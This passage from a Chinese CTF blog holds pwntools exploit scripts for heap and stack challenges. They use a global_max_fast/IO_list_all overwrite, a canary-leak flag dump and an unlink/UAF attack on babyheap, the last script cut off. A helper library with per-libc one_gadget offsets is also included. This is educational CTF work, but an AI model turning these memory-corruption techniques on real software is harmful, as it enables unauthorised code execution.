<span class="comment">#2  free to fastbin and overwrite IO_list_all</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">leak = create(<span class="number">0xa0</span> , <span class="string">'3'</span> * <span class="number">8</span>)</span><br><span class="line">libc.address = u64(leak[<span class="number">8</span>:].ljust(<span class="number">8</span> , <span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">global_max_fast_addr = libc.address + <span class="number">0x3c67f8</span></span><br><span class="line">IO_list_all_addr = libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">success(<span class="string">'libc_base =&gt; '</span> + hex(libc.address))</span><br><span class="line">success(<span class="string">'global_max_fast =&gt; '</span> + hex(global_max_fast_addr))</span><br><span class="line">success(<span class="string">'IO_list_all =&gt; '</span> + hex(IO_list_all_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#overwrite global_mas_fast and free chunk2 to overwrite IO_list_all to fake_file </span></span><br><span class="line">login(p64(libc.address + one_gadget[<span class="number">1</span>]) + p64(global_max_fast_addr - <span class="number">8</span>) , <span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'wrong choice\n'</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#exit() and exec one_gadget to get shell</span></span><br><span class="line">p.recv(<span class="number">1024</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>封了个库</title>
      <link href="/2020/03/12/%E5%B0%81%E4%BA%86%E4%B8%AA%E5%BA%93/"/>
      <url>/2020/03/12/%E5%B0%81%E4%BA%86%E4%B8%AA%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00写在前面"><a href="#0x00写在前面" class="headerlink" title="0x00写在前面"></a>0x00写在前面</h2><p>由于如今各种<strong>ELF</strong>文件<strong>libc</strong>版本跨度比较大，采用虚拟机模式显得过于冗余，于是准备将做题环境都放到<strong>docker</strong>中。原本打算是每个版本的<strong>libc</strong>找个<strong>docker</strong>，但很幸运地发现了一个名为<strong>skysider/pwndocker</strong>的<strong>docker</strong>，该<strong>docker</strong>为<strong>libc-2.27</strong>版本，其上除了正常的做题环境外还集成了多个<strong>libc</strong>的版本，可以用<strong>LD_PRELOAD</strong>来选择不同的<strong>libc</strong>版本，用习惯了之后还是挺方便的。就是每次要加载不同的<strong>libc</strong>时，<strong>process</strong>函数写的太长了，比较麻烦，然后以及原来写<strong>exp</strong>时<strong>pwntools</strong>的各种函数都时敲全名，借此机会封装了个傻逼库，以后更新博客也就都用这个库了。目前是函数的形式进行封装，等以后的功能多了可以考虑改成对象的形式进行封装。</p><a id="more"></a><h2 id="0x01Fish-py"><a href="#0x01Fish-py" class="headerlink" title="0x01Fish.py"></a>0x01<strong>Fish.py</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_shell</span><span class="params">(binary_name , libc_version , OSbit)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> p , version , OS , libc , elf</span><br><span class="line">    version = libc_version</span><br><span class="line">    OS = OSbit</span><br><span class="line"></span><br><span class="line">    libc_path = <span class="string">'/glibc/'</span> + str(version) + <span class="string">'/'</span> + str(OS) + <span class="string">'/lib/libc-'</span> + str(version) + <span class="string">'.so'</span></span><br><span class="line">    ld_path = <span class="string">'/glibc/'</span> + str(version) + <span class="string">'/'</span> + str(OS) + <span class="string">'/lib/ld-'</span> + str(version) + <span class="string">'.so'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(binary_name.find(<span class="string">':'</span>) != <span class="number">-1</span>):</span><br><span class="line">        p = remote(binary_name.split(<span class="string">':'</span>)[<span class="number">1</span>] , int(binary_name.split(<span class="string">':'</span>)[<span class="number">2</span>]))</span><br><span class="line">        binary_name = binary_name.split(<span class="string">':'</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">elif</span>(version == <span class="number">2.27</span>):</span><br><span class="line">        p = process(<span class="string">'./'</span> + binary_name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = process([ld_path,<span class="string">"./"</span>+binary_name],env=&#123;<span class="string">"LD_PRELOAD"</span>:libc_path&#125;)</span><br><span class="line"></span><br><span class="line">    elf = ELF(binary_name)</span><br><span class="line">    libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gadget</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(OS == <span class="number">64</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="number">2.19</span>):</span><br><span class="line">            gadget = [<span class="number">0x403ff</span> , <span class="number">0x40453</span> , <span class="number">0xd806f</span>]</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="number">2.23</span>):</span><br><span class="line">            gadget = [<span class="number">0x3f3d6</span> , <span class="number">0x3f42a</span> , <span class="number">0xd5bf7</span>]</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="number">2.24</span>):</span><br><span class="line">            gadget = [<span class="number">0x3f4b6</span> , <span class="number">0x3f50a</span> , <span class="number">0xd6635</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="number">2.27</span>):</span><br><span class="line">            gadget = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="number">2.28</span>):</span><br><span class="line">            gadget = [<span class="number">0x41982</span> , <span class="number">0x419d6</span> , <span class="number">0xdf882</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="number">2.29</span>):</span><br><span class="line">            gadget = [<span class="number">0xc1710</span> , <span class="number">0xdf202</span> , <span class="number">0xdf20e</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="number">2.19</span>):</span><br><span class="line">            gadget = [<span class="number">0x3b056</span> , <span class="number">0x3b058</span> , <span class="number">0x3b05c</span> , <span class="number">0x3b063</span> , <span class="number">0x64729</span> , <span class="number">0x6472a</span> , <span class="number">0x123e6c</span> , <span class="number">0x123e6d</span>]</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="number">2.23</span>):</span><br><span class="line">            gadget = [<span class="number">0x3a61c</span> , <span class="number">0x3a61e</span> , <span class="number">0x3a622</span> , <span class="number">0x3a629</span> , <span class="number">0x5ee65</span> , <span class="number">0x5ee66</span>]</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="number">2.24</span>):</span><br><span class="line">            gadget = [<span class="number">0x3a32c</span> , <span class="number">0x3a32e</span> , <span class="number">0x3a332</span> , <span class="number">0x3a339</span> , <span class="number">0x5f6b5</span> , <span class="number">0x5f6b6</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="number">2.27</span>):</span><br><span class="line">            gadget = [<span class="number">0x3d0d3</span> , <span class="number">0x3d0d5</span> , <span class="number">0x3d0d9</span> , <span class="number">0x3d0e0</span> , <span class="number">0x67a7f</span> , <span class="number">0x67a80</span> , <span class="number">0x137e5e</span> , <span class="number">0x137e5f</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="number">2.28</span>):</span><br><span class="line">            gadget = [<span class="number">0x3c43b</span> , <span class="number">0x3c43d</span> , <span class="number">0x3c441</span> , <span class="number">0x3c448</span> , <span class="number">0x65a04</span> , <span class="number">0x65a05</span> , <span class="number">0x12e82c</span> , <span class="number">0x12e82d</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="number">2.29</span>):</span><br><span class="line">            gadget = [<span class="number">0x12de0c</span> , <span class="number">0x12de0d</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(gadget)):</span><br><span class="line">        gadget[i] += libc.address</span><br><span class="line">        success(<span class="string">'Gadget['</span> + str(i) + <span class="string">'] =&gt; '</span> + hex(gadget[i]))</span><br><span class="line">    <span class="keyword">return</span> gadget</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(text)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rcv</span><span class="params">(count)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recv(count)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(text)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.sendline(str(text))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(text)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.send(str(text))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Esym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;0&#125;_addr =&gt; &#123;1&#125;'</span>.format(func.lstrip(<span class="string">'_'</span>) , hex(elf.symbols[func])))</span><br><span class="line">    <span class="keyword">return</span> elf.symbols[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">got</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;0&#125;_got =&gt; &#123;1&#125;'</span>.format(func , hex(elf.got[func])))</span><br><span class="line">    <span class="keyword">return</span> elf.got[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">plt</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;0&#125;_plt =&gt; &#123;1&#125;'</span>.format(func , hex(elf.plt[func])))</span><br><span class="line">    <span class="keyword">return</span> elf.plt[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LeakStrFormat</span><span class="params">(text)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> u64(text.rjust(<span class="number">8</span> , <span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LeakCharFormat</span><span class="params">(text)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> u64(text.ljust(<span class="number">8</span> , <span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SetELFBase</span><span class="params">(ELFBase)</span>:</span></span><br><span class="line">    elf.address = ELFBase</span><br><span class="line">    success(<span class="string">'ELF_base =&gt; &#123;0&#125;'</span>.format(hex(ELFBase)))</span><br><span class="line">    <span class="keyword">return</span> elf.address</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SetLibcBase</span><span class="params">(LibcBase)</span>:</span></span><br><span class="line">    libc.address = LibcBase</span><br><span class="line">    success(<span class="string">'Libc_base =&gt; &#123;0&#125;'</span>.format(hex(LibcBase)))</span><br><span class="line">    <span class="keyword">return</span> libc.address</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SetHeapBase</span><span class="params">(HeapBase)</span>:</span></span><br><span class="line">    success(<span class="string">'Heap_base =&gt; &#123;0&#125;'</span>.format(hex(HeapBase)))</span><br><span class="line">    <span class="keyword">return</span> HeapBase</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;0&#125;_addr =&gt; &#123;1&#125;'</span>.format(func.lstrip(<span class="string">'_'</span>) , hex(libc.symbols[func])))</span><br><span class="line">    <span class="keyword">return</span> libc.symbols[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binsh</span><span class="params">()</span>:</span></span><br><span class="line">    binsh_addr = libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line">    success(<span class="string">'binsh_addr =&gt; &#123;0&#125;'</span>.format(hex(binsh_addr)))</span><br><span class="line">    <span class="keyword">return</span> binsh_addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> pidof(p)</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">active</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">close</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbglog</span><span class="params">()</span>:</span></span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯第一场Writeup</title>
      <link href="/2020/03/12/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%9C%BAWriteup/"/>
      <url>/2020/03/12/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%9C%BAWriteup/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-Guess"><a href="#0x01-Guess" class="headerlink" title="0x01 Guess"></a>0x01 Guess</h2><ul><li>程序功能</li></ul><p>程序先将<strong>flag</strong>读入内存中，然后与用户输入相比较，程序会<strong>fork</strong>三次，在三次之后还猜不对则退出。</p><a id="more"></a><ul><li>漏洞位置</li></ul><p>在用户输入<strong>flag</strong>时，是用<strong>gets()</strong>进行输入，此处存在栈溢出<br><img src="https://upload-images.jianshu.io/upload_images/8447551-e5a33f19fad85e62.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="vul"></p><ul><li>利用思路<br>程序开了<strong>canary</strong>，存在栈溢出，并且把<strong>flag</strong>读到了内存中，我们可以考虑触发<strong>__stack_check_fail</strong>的异常处理链将内存中的<strong>flag</strong>打印出来，由于没有固定的地址，存在于栈中，所以要先<strong>leak</strong>栈地址，最后算出偏移将<strong>flag</strong>打印出来。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-a7deabcc0cecc7f5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="checksec"></li></ul><blockquote><p><strong>libc</strong>中有个<strong>environ</strong>指针指向存放环境变量的地址(栈上面)，可通过此指针<strong>leak</strong>出栈地址。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-be76e3f8e5e0bc2c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="environ"></p></blockquote><ul><li>my-exp<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./GUESS'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'time is up!'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess</span><span class="params">(flag)</span>:</span></span><br><span class="line">    flag = p64(<span class="number">0</span>) * <span class="number">37</span> + flag</span><br><span class="line">    p.recvuntil(<span class="string">'Please type your guessing flag\n'</span>)</span><br><span class="line">    p.sendline(flag)</span><br><span class="line">    p.recvuntil(<span class="string">'***: '</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(<span class="string">' ter'</span>)[:<span class="number">-4</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> pidof(p)[<span class="number">0</span>]</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./GUESS'</span>)</span><br><span class="line"><span class="comment">#step1 leak libc_base</span></span><br><span class="line">gets_got = elf.got[<span class="string">'gets'</span>]</span><br><span class="line">success(<span class="string">'gets_got =&gt; '</span> + hex(gets_got))</span><br><span class="line">libc.address = u64(guess(p64(gets_got)) + <span class="string">'\x00'</span> * <span class="number">2</span>) - libc.symbols[<span class="string">'gets'</span>]</span><br><span class="line">success(<span class="string">'libc_base =&gt; '</span> + hex(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment">#step2 leak environ_addr on the stack</span></span><br><span class="line">environ_addr_ptr = libc.symbols[<span class="string">'environ'</span>]</span><br><span class="line">environ_addr= u64(guess(p64(environ_addr_ptr)) + <span class="string">'\x00'</span> * <span class="number">2</span>)</span><br><span class="line">success(<span class="string">'environ_addr =&gt; '</span> + hex(environ_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#step3 calc the offset of flag</span></span><br><span class="line"><span class="keyword">print</span> guess(p64(environ_addr - <span class="number">0x168</span>))</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x02-babyheap"><a href="#0x02-babyheap" class="headerlink" title="0x02 babyheap"></a>0x02 babyheap</h2><ul><li>程序功能</li></ul><p>可申请最多<strong>10次</strong>的大小为<strong>0x20</strong>的<strong>chunk</strong>，最多可<strong>edit 3</strong>次<strong>chunk</strong>中的内容。</p><ul><li>漏洞位置</li></ul><p><strong>free</strong>后不清空指针使<strong>.bss</strong>上存在<strong>Dangling ptr</strong>。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-6d11435e878af827.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="free"><br><strong>edit</strong>时不会检查是否已经<strong>free</strong>可造成<strong>uaf</strong>。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-ad5e9fb30a82e38d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="edit"></p><ul><li>利用思路<br>因为只能<strong>edit3</strong>次，所以每次<strong>edit</strong>都要很精确。先利用连在一起的<strong>fastbin</strong>中构造出一个<strong>unlink</strong>的结构，并顺带<strong>leak</strong>出<strong>heap_base</strong>。<strong>第一次edit</strong>，在堆上构造<strong>fastbin attack</strong>，使在数组中出现触发<strong>unink</strong>的指针。<strong>第二次edit</strong>，写自身为<strong>free_hook</strong>，<strong>第三次edit</strong>，将<strong>free_hook</strong>写为<strong>system</strong>。<strong>但是</strong>！我死活没有<strong>leak</strong>出<strong>libc</strong>基址，从而无法在第二次将自身写为<strong>free_hook</strong>，也刚好无法写到<strong>limit</strong>的位置，于是我想了个骚操作绕了一大圈(下见被三个引号注释的脚本)：将本该存堆指针的地方重新伪造个<strong>0x31</strong>来做<strong>fastbin attack</strong>，这样我就可以通过<strong>add</strong>来修改<strong>limit</strong>甚至修改可以索引到的指针来搞很多事情，虽然我只需要将<strong>leak</strong>一下<strong>libc</strong>基址，然后再写自身就行了。<del>当时做出来的时候我觉得我简直是个天才，</del>然后看了别人的<strong>writeup</strong>发现我简直是个<strong>傻逼</strong>，既然已经<strong>unlink</strong>获得了写自己的指针，第二次<strong>edit</strong>的时候把指针下移，第三次<strong>edit</strong>就可以直接改<strong>limit</strong>了。(下见未注释的脚本)。</li></ul><blockquote><p><strong>unlink</strong>时只需满足<strong>free</strong>堆块的<strong>size</strong>不在<strong>fastbin</strong>范围内，进行<strong>unlink</strong>的堆块的<strong>size</strong>无所谓。<strong>unlink</strong>后产生的指向自己上面的指针可以有大作用，不要想的太死板了。</p></blockquote><ul><li>my-exp<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./babyheap'</span>)</span><br><span class="line">    elf = ELF(<span class="string">'./babyheap'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Time is up!'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index , content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    p.recvuntil(<span class="string">'Done!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index , content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    p.recvuntil(<span class="string">'Done!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(<span class="string">'Done!'</span>)[:<span class="number">-6</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Done!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> pidof(p)[<span class="number">0</span>]</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">success(<span class="string">'free_got =&gt; '</span> + hex(free_got))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak heap_base</span></span><br><span class="line">ptr = <span class="number">0x6020a8</span></span><br><span class="line">fake_fd = ptr - <span class="number">0x18</span></span><br><span class="line">fake_bk = ptr - <span class="number">0x10</span></span><br><span class="line">fake_unlink = p64(<span class="number">0</span>) + p64(<span class="number">0xb1</span>) + p64(fake_fd) + p64(fake_bk)</span><br><span class="line">fake_head = p64(<span class="number">0xb0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">9</span> , fake_unlink[:<span class="number">-1</span>])</span><br><span class="line">add(<span class="number">1</span> , <span class="string">'1'</span> * <span 